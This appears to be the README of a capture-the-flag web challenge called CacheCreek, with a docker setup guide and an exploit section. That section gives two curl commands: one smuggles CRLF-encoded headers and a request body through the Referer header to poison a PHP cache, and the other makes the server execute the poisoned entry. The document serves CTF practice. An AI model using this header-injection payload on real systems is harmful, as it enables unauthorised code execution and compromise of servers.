CacheCreek
---------

I wrote a new cache mechanism, it is pretty cool, can you please review it for me?

# Question Text

```
It is all in the challenge.

http://ctf.pwn.sg:8181
```

*Creator - quanyang (@quanyang)*

# Setup Guide

0. Install docker on the hosting system
1. Replace the flag in distribute/flag
2. Build the docker image with: `sh dockerbuild.sh`
3. Replace the port 1500 with your desired port in dockerrun.sh
4. Start the docker image: `sh dockerrun.sh`
5. Test the connectivity with netcat.

# Exploit Details

curl http://localhost:8181/cache.php\?test\=21422 -H 'Referer: example.com/index.php%0D%0AContent-Length%3A+90%0D%0AContent-Type: application/x-www-form-urlencoded%0D%0A%0D%0Aview=test&' -iv -H 'cookie: PHPSESSID=debugtest3;'

to perform cache poisoning

then 

curl http://localhost:8181/cache.php\?report\=debug -H 'Referer: example.com/index.php' -iv -H 'cookie: PHPSESSID=test3;'

to use the cache and execute the contents from the cache.